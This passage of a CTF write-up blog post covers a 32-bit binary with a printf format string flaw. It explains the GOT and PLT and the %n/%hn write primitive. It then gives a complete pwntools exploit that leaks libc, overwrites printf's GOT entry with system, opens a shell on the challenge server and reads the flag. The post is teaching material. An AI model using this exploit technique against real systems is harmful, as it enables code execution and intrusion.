+</span><span>  </span><span style="color:#f28779;">setvbuf</span><span>(stdout</span><span style="color:#ccc9c2cc;">,</span><span>(</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>)</span><span style="color:#ffcc66;">0x0</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Howdy!&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;You might find this useful: </span><span style="color:#ffcc66;">%x</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span>puts</span><span style="color:#ccc9c2cc;">,</span><span>uVar1</span><span style="color:#ccc9c2cc;">,</span><span>uVar2</span><span style="color:#ccc9c2cc;">,</span><span>puVar3)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">do </span><span>{
+</span><span>    </span><span style="color:#ffd580;">vuln</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>  } </span><span style="color:#ffa759;">while</span><span>( </span><span style="color:#ffcc66;">true </span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span>
+</span><span style="color:#ffa759;">void </span><span style="color:#ffd580;">vuln</span><span>(</span><span style="color:#ffa759;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style="color:#ffa759;">char</span><span> local_4c [</span><span style="color:#ffcc66;">68</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  </span><span style="color:#f28779;">system</span><span>(</span><span style="color:#bae67e;">&quot;printf </span><span style="color:#95e6cb;">\&quot;</span><span style="color:#bae67e;">Hey!  I</span><span style="color:#95e6cb;">\&#39;</span><span style="color:#bae67e;">ll repeat anything you say! </span><span style="color:#95e6cb;">\n\&quot;</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">fgets</span><span>(local_4c</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x40</span><span style="color:#ccc9c2cc;">,</span><span>stdin)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">printf</span><span>(local_4c)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>The vuln function has a trivial format string vulnerability, who would've thought lol.  A little more interesting, the main function tells us the address of puts.</p>
+<h3 id="a-little-background-on-the-got">a little background on the GOT</h3>
+<p>So there are two different ways to load libraries in a binary.  You can <strong>statically link</strong> them (self contained, each binary contains all code in a single file) or you can <strong>dynamically link</strong> them (default in most compilers, it will map the binary file in memory at runtime).  Now, if you're loading files into a random offset at runtime you can't exactly determine what addresses to call at compile-time.  The technique which allows looking up these addresses up at runtime is known as <strong>relocation</strong> and is handled by the linker.  To manage this we have a couple relevant sections of the ELF.</p>
+<h4 id="plt">.plt</h4>
+<p>The PLT (or Procedure Linkage Table) is a collection of stumbs which jump to the appropriate location in the <code>.got.plt</code> and and then if needed tell the linker to resolve the address.</p>
+<h4 id="got">.got</h4>
+<p>The GOT is the table of addresses which point to symbols in dynamically loaded libraries.</p>
+<h4 id="got-plt">.got.plt</h4>
+<p>the <code>.got.plt</code> is also a table of addresses -- so what's the difference between it and the <code>.got</code>?  The <code>.got.plt</code> contains addresses to either the <code>.got</code> (if we have already looked up that symbol) or back to the <code>.plt</code> (if we need to tell the linker to grab the address for it)</p>
+<h3 id="how-do-we-take-advantage-of-this-to-exploit">how do we take advantage of this to exploit?</h3>
+<p>Well, the implication here is that <code>.got</code> and <code>.got.plt</code> are updated at runtime (unless you have full RELRO on but this binary doesn't) which means they are writable.  They are also located at a constant address in the binary.  As the final piece of this puzzle, you can use the <code>%n</code> format specifier to write arbitrary memory to arbitrary locations.  Wild, huh?</p>
+<h3 id="actually-using-the-n-format-specifier">actually using the %n format specifier</h3>
+<p>So, the %n format specifier writes the number of characters which have already been written to the pointer in matching argument.  You can tell printf to right-justify a value with arbitrary length which means you can make %n write whatever you'd like and we have stack control which means we can do that wherever we'd like.  Like most format specifiers you can also use it like <code>%hn</code> to only write a short (two bytes) instead.  By breaking a write into two like this you can avoid having to write several billion characters to stdout.</p>
+<h3 id="the-actual-exploit">the actual exploit</h3>
+<p>So, what we're doing here is overwriting the GOT value for <code>printf</code> to actually be <code>system</code>.  After that we can just type <code>/bin/sh</code> into the input and it'll call <code>system</code> instead of <code>printf</code>.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3
+</span><span>
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span style="color:#ffa759;">import </span><span>re
+</span><span>
+</span><span>context</span><span style="color:#f29e74;">.</span><span>log_level </span><span style="color:#f29e74;">= </span><span>logging</span><span style="color:#f29e74;">.</span><span>ERROR
+</span><span>
+</span><span>elf </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./chall&quot;</span><span>)
+</span><span>libc </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./libc.so.6&quot;</span><span>)
+</span><span>
+</span><span>rop </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ROP</span><span>(elf)
+</span><span>
+</span><span>context</span><span style="color:#f29e74;">.</span><span>binary </span><span style="color:#f29e74;">= </span><span>elf
+</span><span>context</span><span style="color:#f29e74;">.</span><span>terminal </span><span style="color:#f29e74;">= </span><span>[</span><span style="color:#bae67e;">&#39;termite&#39;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&#39;-e&#39;</span><span>]
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>LOCAL:
+</span><span>        libc </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;/usr/lib32/libc.so.6&quot;</span><span>)
+</span><span>        </span><span style="color:#ffa759;">return </span><span>(libc</span><span style="color:#ccc9c2cc;">, </span><span>elf</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">process</span><span>())
+</span><span>    </span><span style="color:#ffa759;">else</span><span>:
+</span><span>        libc </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./libc.so.6&quot;</span><span>)
+</span><span>        </span><span style="color:#ffa759;">return </span><span>(libc</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;ctf.cybr.club&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">2005</span><span>))
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    (libc</span><span style="color:#ccc9c2cc;">, </span><span>p) </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span>()
+</span><span>
+</span><span>    p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()
+</span><span>    puts_address </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>(</span><span style="color:#bae67e;">&#39;ascii&#39;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">split</span><span>(</span><span style="color:#bae67e;">&quot;: &quot;</span><span>)[</span><span style="color:#ffcc66;">1</span><span>]</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">16</span><span>)
+</span><span>    libc</span><span style="color:#f29e74;">.</span><span>address </span><span style="color:#f29e74;">= </span><span>puts_address </span><span style="color:#f29e74;">- </span><span>libc</span><span style="color:#f29e74;">.</span><span>sym[</span><span style="color:#bae67e;">&#39;puts&#39;</span><span>]
+</span><span>    lower </span><span style="color:#f29e74;">= </span><span>(libc</span><span style="color:#f29e74;">.</span><span>sym[</span><span style="color:#bae67e;">&#39;system&#39;</span><span>] </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">8</span><span>) </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0xffff
+</span><span>    upper </span><span style="color:#f29e74;">= </span><span>libc</span><span style="color:#f29e74;">.</span><span>sym[</span><span style="color:#bae67e;">&#39;system&#39;</span><span>] </span><span style="color:#f29e74;">&gt;&gt; </span><span style="color:#ffcc66;">16
+</span><span>
+</span><span>    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">p32</span><span>(elf</span><span style="color:#f29e74;">.</span><span>got[</span><span style="color:#bae67e;">&#39;printf&#39;</span><span>]) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p32</span><span>(elf</span><span style="color:#f29e74;">.</span><span>got[</span><span style="color:#bae67e;">&#39;printf&#39;</span><span>]</span><span style="color:#f29e74;">+</span><span style="color:#ffcc66;">2</span><span>) </span><span style="font-style:italic;color:#5c6773;"># add the addresses for both halves of printf to stack
+</span><span>    payload </span><span style="color:#f29e74;">+= </span><span style="color:#bae67e;">&quot;%</span><span style="color:#ffcc66;">{}</span><span style="color:#bae67e;">x&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">format</span><span>(lower)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>(</span><span style="color:#bae67e;">&#39;ascii&#39;</span><span>) </span><span style="color:#f29e74;">+ </span><span style="color:#bae67e;">&quot;%</span><span style="color:#ffcc66;">{}</span><span style="color:#bae67e;">$hn&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">format</span><span>(</span><span style="color:#ffcc66;">4</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>(</span><span style="color:#bae67e;">&#39;ascii&#39;</span><span>) </span><span style="font-style:italic;color:#5c6773;"># write to the first half, the %x is justified by the appropriate number to be equal to the lower half of system&#39;s address
+</span><span>    payload </span><span style="color:#f29e74;">+= </span><span style="color:#bae67e;">&quot;%</span><span style="color:#ffcc66;">{}</span><span style="color:#bae67e;">x&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">format</span><span>(upper </span><span style="color:#f29e74;">- </span><span>lower </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">8</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>(</span><span style="color:#bae67e;">&#39;ascii&#39;</span><span>) </span><span style="color:#f29e74;">+ </span><span style="color:#bae67e;">&quot;%</span><span style="color:#ffcc66;">{}</span><span style="color:#bae67e;">$hn&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">format</span><span>(</span><span style="color:#ffcc66;">5</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>(</span><span style="color:#bae67e;">&#39;ascii&#39;</span><span>) </span><span style="font-style:italic;color:#5c6773;"># write to the upper half, the %x is justified in a similar way but we also need to subtract the lower value because that is still taken into account on the second %n.  If lower were larger than upper we could do the exact same thing in reverse
+</span><span>    
+</span><span>    p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;Hey!  I&#39;ll repeat anything you say! </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>    p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(payload)
+</span><span>    p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;Hey!  I&#39;ll repeat anything you say! </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>    p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;/bin/sh/&quot;</span><span>)
+</span><span>
+</span><span>    p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;cat flag.txt;exit&quot;</span><span>)
+</span><span>    </span><span style="color:#f28779;">print</span><span>(re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#bae67e;">&quot;(FLAG{.*})&quot;</span><span style="color:#ccc9c2cc;">,</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvall</span><span>(</span><span style="color:#ffcc66;">timeout</span><span style="color:#f29e74;">=</span><span style="color:#ccc9c2cc;">.</span><span style="color:#ffcc66;">1</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>())</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">1</span><span>))
+</span><span>
+</span><span>    p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">close</span><span>()
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
+</span><span>    </span><span style="color:#ffd580;">main</span><span>()
+</span></code></pre>
+<p>flag: <code>FLAG{f0rm47_57r1n6_wr173_a357ac}</code></p>
+
+    </div>
+
+    
+    <div class="article-info">
+        
+        <div class="article-date"> 1 February 2021</div>
+        
+        <div class="article-taxonomies">
+            
+            
+                <ul class="article-tags">
+                    
+                    <li><a href="https://tsheinen.github.io/tags/ctf-writeups/">#ctf-writeups</a></li>
+                    
+                </ul>
+            
+        </div>
+    </div>
+
+</article>
+
+<script>
+window.onscroll = function() {
+    if (window.innerHeight + window.pageYOffset >= document.body.offsetHeight) {
+        var count = 200;
+        var defaults = {
+          origin: { y: 0.7 }
+        };
+
+        function fire(particleRatio, opts) {
+          confetti(Object.assign({}, defaults, opts, {
+            particleCount: Math.floor(count * particleRatio)
+          }));
+        }
+
+        fire(0.25, {
+          spread: 26,
+          startVelocity: 55,
+        });
+        fire(0.2, {
+          spread: 60,
+        });
+        fire(0.35, {
+          spread: 100,
+          decay: 0.91,
+          scalar: 0.8
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 25,
+          decay: 0.92,
+          scalar: 1.2
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 45,
+        });
+    }
+}
+</script>
+<script type="text/javascript" src="/js/navbar.js"></script>
+
+
+        </main>
+        <footer>
+            
+            
+        </footer>
+    </div>
+
+
+
+    <details data-popover="up" style="right: 20px;top: 20px;">
+      <summary>
+		  <svg class="paint-roller" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="paint-roller" class="svg-inline--fa fa-paint-roller fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M416 128V32c0-17.67-14.33-32-32-32H32C14.33 0 0 14.33 0 32v96c0 17.67 14.33 32 32 32h352c17.67 0 32-14.33 32-32zm32-64v128c0 17.67-14.33 32-32 32H256c-35.35 0-64 28.65-64 64v32c-17.67 0-32 14.33-32 32v128c0 17.67 14.33 32 32 32h64c17.67 0 32-14.33 32-32V352c0-17.67-14.33-32-32-32v-32h160c53.02 0 96-42.98 96-96v-64c0-35.35-28.65-64-64-64z"/></svg>
+      </summary>
+      <div class="swatch-container">
+          
+            <div class="swatch-child" onclick="setTheme('Dark')">
+                <div style="text-align: center;">
+                  <div data-theme=Dark class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Dark </span>
+              </div>
+            </div>
+          
+            <div class="swatch-child" onclick="setTheme('Light')">
+                <div style="text-align: center;">
+                  <div data-theme=Light class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Light </span>
+              </div>
+            </div>
+          
+      </div>
+    </details>
+
+    <!-- Cloudflare Web Analytics -->
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "1e533cda4e344b0bb7c6bf7aef70a519"}'></script>
+    <!-- End Cloudflare Web Analytics -->
+
+    <script type="text/javascript" src="https://tsheinen.github.io/elasticlunr.min.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/search_index.en.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/js/search.js"></script>
+</body>
+</html>
